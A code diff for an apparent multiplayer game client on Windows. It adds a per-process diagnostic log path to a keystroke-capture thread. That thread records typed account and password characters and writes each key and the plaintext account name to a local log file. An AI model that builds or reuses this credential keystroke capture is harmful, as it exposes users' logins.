@@ -52,6 +52,17 @@ bool MP_WaitCtrlResult(BYTE expectCmd, int timeoutMs, BYTE &outByte) {
 	}
 }
 
+// [v61-diag] Per-process diagnostic log path. See MPClient.h for why a shared
+// filename made the v60 client logs unreadable.
+const char *MP_DiagPath() {
+	static char s_path[64] = { 0 };
+	if (s_path[0] == 0) {
+		sprintf_s(s_path, sizeof(s_path), "D:/mp_diag_%lu.log",
+			(unsigned long)GetCurrentProcessId());
+	}
+	return s_path;
+}
+
 // ---- 网络发送 ----
 bool MP_IsConnected() { return g_connected != 0; }
 
@@ -211,7 +222,7 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 					// [DIAG] 每5秒记录一次捕获活跃状态
 					diagCounter++;
 					if (diagCounter % 500 == 0) {  // 500 * 10ms = 5s
-						FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+						FILE *df = NULL; fopen_s(&df, MP_DiagPath(), "a");
 						if (df) {
 							fprintf(df, "[MP-CAP] active: acc=%d chars pw=%d chars field=%d\n",
 								(int)g_capAccount.size(), (int)g_capPassword.size(), g_capField);
@@ -239,7 +250,7 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 								g_capField = 1; g_capLocked = true;
 							}
 							LeaveCriticalSection(&g_capCs);
-							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+							{ FILE *df = NULL; fopen_s(&df, MP_DiagPath(), "a");
 							  if (df) { fprintf(df, "[MP-CAP] Tab -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
 						}
 					// [v54] Mouse click: same one-way switch, only if account has content.
@@ -249,7 +260,7 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 								g_capField = 1; g_capLocked = true;
 							}
 							LeaveCriticalSection(&g_capCs);
-							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+							{ FILE *df = NULL; fopen_s(&df, MP_DiagPath(), "a");
 							  if (df) { fprintf(df, "[MP-CAP] mouse click -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
 					}
 						// --- Backspace: 删除末尾字符 ---
@@ -285,7 +296,7 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 								if (target.size() > 64) target.resize(64);
 								LeaveCriticalSection(&g_capCs);
 								// [DIAG] 记录捕获到的字符
-								{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+								{ FILE *df = NULL; fopen_s(&df, MP_DiagPath(), "a");
 								  if (df) { fprintf(df, "[MP-CAP] key vk=%02X ch='%c' field=%d acc='%s'\n", vk, (char)ch, g_capField, g_capAccount.c_str()); fflush(df); fclose(df); } }
 							}
 						}
